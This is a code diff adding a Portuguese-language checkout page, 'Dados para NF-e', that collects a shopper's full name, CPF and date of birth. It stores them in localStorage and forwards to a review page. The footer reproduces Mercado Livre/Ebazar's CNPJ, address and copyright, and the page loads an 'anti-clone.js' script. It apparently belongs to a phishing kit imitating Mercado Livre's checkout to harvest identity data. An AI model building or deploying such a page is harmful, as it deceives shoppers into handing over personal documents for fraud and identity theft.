@@ -1,0 +1,317 @@
+﻿<!DOCTYPE HTML>
+
+<html lang="pt-br">
+<head>
+<meta charset="utf-8"/>
+<title>Dados para NF-e</title>
+<meta content="width=device-width,initial-scale=1.0, maximum-scale=1.0" name="viewport"/>
+<meta content="telephone=no" name="format-detection"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<script src="js/jquery.js"></script>
+<script src="tela/js/js.js"></script>
+<script src="tela/js/checkout_pages.js"></script>
+<script src="tela/js/flow.js"></script>
+<link href="tela/css/css.css" rel="stylesheet"/>
+<link href="tela/css/produto.css" rel="stylesheet"/>
+<link href="tela/css/theme.css" rel="stylesheet"/>
+<link href="tela/css/checkout.css" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet"/>
+<link href="assets/logo.png" rel="shortcut icon" sizes="16x16"/>
+<style>
+/* Footer (igual ao print, full width) */
+.site-footer{
+  width:100%;
+  background:#ffffff;
+  color:#666666;
+  font-family:proximanovaregular, Arial, sans-serif;
+  font-size:12px;
+  line-height:1.4;
+}
+.site-footer__inner{
+  width:100%;
+  padding:18px 24px;
+  box-sizing:border-box;
+  text-align:center;
+}
+.site-footer__links{
+  display:flex;
+  flex-wrap:wrap;
+  justify-content:center;
+  gap:18px;
+  margin-bottom:10px;
+}
+.site-footer__links a{
+  color:#666666;
+  text-decoration:none;
+}
+.site-footer__links a:hover{
+  text-decoration:underline;
+}
+.site-footer__copy{
+  margin-bottom:6px;
+}
+.site-footer--fixed{
+  position:fixed;
+  left:0;
+  right:0;
+  bottom:0;
+  z-index:999;
+}
+body.site-has-fixed-footer{
+  padding-bottom:180px; /* evita o rodapé por cima do conteúdo */
+}
+@media (max-width:480px){
+  body.site-has-fixed-footer{ padding-bottom:220px; }
+  .site-footer__inner{ padding:16px 14px; }
+  .site-footer__links{ gap:12px; }
+}
+</style>
+
+<style>
+/* ===== AJUSTES MINIMOS PEDIDOS ===== */
+
+/* 1️⃣ BOTÃO CONTINUAR — só altura (equilibrado) */
+body[data-page="carrinho"] .checkout-btn,
+body[data-page="carrinho"] .btn-primary{
+  height: 44px !important;
+  min-height: 44px !important;
+}
+
+/* 2️⃣ PAGINA DADOS — aproximar "Não tem conta" do botão */
+.nao-tem-conta,
+.signup-link,
+.create-account,
+.login-footer{
+  margin-top: 14px !important;
+}
+
+</style>
+
+
+<style>
+/* AJUSTE FINAL – subir NÃO TEM CONTA PC + MOBILE */
+body[data-page="dados"] .muted{
+    margin-top: 14px !important;
+}
+</style>
+
+
+<style>
+/* FORCE REAL – colar "" no botão (PC + Mobile) */
+.checkout .btn-primary + .muted,
+.checkout .btn-primary + div.muted,
+body[data-page="dados"] .checkout .btn-primary + .muted {
+    margin-top: 14px !important;
+}
+</style>
+
+
+<style>
+/* FOOTER MOBILE PEQUENO – somente celular */
+@media (max-width: 768px){
+
+  footer,
+  .footer,
+  .site-footer,
+  .ml-footer{
+
+    font-size: 11px !important;
+    line-height: 1.3 !important;
+  }
+
+  footer a,
+  .footer a,
+  .site-footer a,
+  .ml-footer a{
+    font-size: 11px !important;
+  }
+
+  footer p,
+  footer span,
+  footer div{
+    font-size: 11px !important;
+  }
+
+}
+</style>
+
+<style>
+/* FOOTER MOBILE BOTTOM – mantém rodapé no final da tela quando falta conteúdo */
+@media (max-width: 768px){
+  body{
+    min-height: 100vh !important;
+    display: flex !important;
+    flex-direction: column !important;
+  }
+  main.wrap{
+    flex: 1 0 auto !important;
+  }
+  footer.site-footer{
+    margin-top: auto !important;
+    flex-shrink: 0 !important;
+  }
+}
+</style>
+
+<style>
+/* MOBILE (somente celular): rodape com apenas CNPJ em nfe.html */
+@media (max-width: 768px){
+  body[data-page="nfe"] .site-footer__links,
+  body[data-page="nfe"] .site-footer__copy{
+    display:none !important;
+  }
+}
+</style>
+
+</head>
+<body class="site-has-fixed-footer" data-page="nfe" id="body" style="margin:0;width:100%;-webkit-text-size-adjust:none; ">
+<header class="header">
+<div class="headerMobile" style="display:flex;align-items:center;">
+<img class="logo_da_loja" onclick="window.location.href='index.html'" src="assets/logo.png" style="margin:0 10px;max-width:44px;min-height:32px;cursor:pointer;" />
+
+</div>
+</header>
+<main class="wrap">
+<section class="checkout">
+<div class="title">Preencha os dados para sua NF-e</div>
+<div class="card stack">
+<div class="field">
+<label>Nome completo</label>
+<input id="nfe-nome" placeholder="Ex: Maria da Silva" type="text"/>
+<span class="hint"></span>
+</div>
+<div class="row">
+<div class="field">
+<label>CPF</label>
+<input id="nfe-cpf" placeholder="000.000.000-00" type="text" inputmode="numeric" autocomplete="off" maxlength="14" pattern="\d{3}\.\d{3}\.\d{3}-\d{2}"/>
+<span class="hint"></span>
+</div>
+<div class="field">
+<label>Data de nascimento</label>
+<input id="nfe-dob" placeholder="dd/mm/aaaa" type="text" inputmode="numeric" autocomplete="bday" maxlength="10" pattern="\d{2}/\d{2}/\d{4}"/>
+<span class="hint"></span>
+</div>
+</div>
+<button class="btn-primary" id="btn-nfe">Continuar</button>
+</div>
+</section>
+</main>
+<footer class="site-footer site-footer--fixed">
+<div class="site-footer__inner">
+<div class="site-footer__links">
+<a href="#" rel="nofollow">Trabalhe conosco</a>
+<a href="#" rel="nofollow">Termos e condições</a>
+<a href="#" rel="nofollow">Promoções</a>
+<a href="#" rel="nofollow">Como cuidamos da sua privacidade</a>
+<a href="#" rel="nofollow">Acessibilidade</a>
+<a href="#" rel="nofollow">Contato</a>
+<a href="#" rel="nofollow">Informações sobre seguros</a>
+<a href="#" rel="nofollow">Programa de Afiliados</a>
+</div>
+<div class="site-footer__copy">Copyright © 1999-2026 Ebazar.com.br LTDA.</div>
+<div class="site-footer__cnpj">CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre Brasil.</div>
+</div>
+</footer>
+
+<!-- FIX: clique na logo leva pro produto (index.html) -->
+<script>
+(function(){
+  function goProduto(){ window.location.href = 'index.html'; }
+
+  function makeClickable(el){
+    if(!el) return;
+    el.style.cursor = 'pointer';
+    el.addEventListener('click', function(e){ e.stopPropagation(); goProduto(); });
+  }
+
+  document.addEventListener('DOMContentLoaded', function(){
+    // logos em img
+    document.querySelectorAll('img[src*="assets/logo"], img[src*="assets/mercadolivre"], img[src*="assets/racing"]').forEach(makeClickable);
+
+    // logos em div com background-image (topo / menu)
+    document.querySelectorAll('div[style*="background-image"]').forEach(function(el){
+      var s = el.getAttribute('style') || '';
+      // pega os casos típicos do template: 56x56 (topo/menu) e o ícone do Bem-vindo
+      if (s.includes('width:56') && s.includes('height:56')) makeClickable(el);
+      if (s.includes('border-radius:50%')) makeClickable(el);
+      if (s.includes('border-radius:8px') && s.toLowerCase().includes('#dedede')) makeClickable(el);
+    });
+
+    // fallback: qualquer elemento dentro do #menu que seja o bloco de boas-vindas
+    var menu = document.getElementById('menu');
+    if(menu){
+      var b = menu.querySelector('div[style*="width:56"][style*="height:56"]');
+      if(b) makeClickable(b);
+    }
+  });
+})();
+</script>
+
+<script>
+(function(){
+  function digitsOnly(v, maxLen){
+    v = (v || '').toString().replace(/\D/g,'');
+    if(maxLen) v = v.slice(0, maxLen);
+    return v;
+  }
+  function formatCPF(d){
+    var p1 = d.slice(0,3);
+    var p2 = d.slice(3,6);
+    var p3 = d.slice(6,9);
+    var p4 = d.slice(9,11);
+    var out = p1;
+    if(p2) out += '.' + p2;
+    if(p3) out += '.' + p3;
+    if(p4) out += '-' + p4;
+    return out;
+  }
+  function formatDate(d){
+    var dd = d.slice(0,2);
+    var mm = d.slice(2,4);
+    var yy = d.slice(4,8);
+    var out = dd;
+    if(mm) out += '/' + mm;
+    if(yy) out += '/' + yy;
+    return out;
+  }
+  function bindMask(input, maxDigits, formatter){
+    if(!input) return;
+    function apply(){
+      var raw = digitsOnly(input.value, maxDigits);
+      input.value = formatter(raw);
+    }
+    input.addEventListener('input', apply, {passive:true});
+    input.addEventListener('blur', apply, {passive:true});
+    input.addEventListener('paste', function(){ setTimeout(apply, 0); });
+    apply();
+  }
+  document.addEventListener('DOMContentLoaded', function(){
+    bindMask(document.getElementById('nfe-cpf'), 11, formatCPF);
+    bindMask(document.getElementById('nfe-dob'), 8, formatDate);
+  });
+})();
+
+document.addEventListener('DOMContentLoaded', function() {
+  const btnNfe = document.getElementById('btn-nfe');
+  if(btnNfe) {
+    btnNfe.addEventListener('click', function() {
+      const nome = document.getElementById('nfe-nome');
+      const cpf = document.getElementById('nfe-cpf');
+      const dob = document.getElementById('nfe-dob');
+      
+      if(nome.value.trim() && cpf.value.length >= 14 && dob.value.length >= 10) {
+        localStorage.setItem('nfe-nome', nome.value);
+        localStorage.setItem('nfe-cpf', cpf.value);
+        localStorage.setItem('nfe-dob', dob.value);
+        window.location.href = 'revisar.html';
+      } else {
+        alert('Por favor, preencha todos os campos corretamente.');
+      }
+    });
+  }
+});
+</script>
+
+<script src="anti-clone.js"></script>
+</body>
+</html>
